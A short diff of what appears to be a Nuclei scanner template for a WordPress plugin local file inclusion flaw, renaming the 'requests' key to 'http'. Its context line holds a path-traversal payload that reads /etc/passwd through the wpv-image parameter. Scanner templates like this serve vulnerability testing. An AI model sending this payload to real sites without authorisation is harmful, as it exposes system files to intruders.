@@ -7,7 +7,7 @@ info:
   reference: https://www.exploit-db.com/exploits/40850
   tags: wp-plugin,wordpress,lfi
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/?wpv-image=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
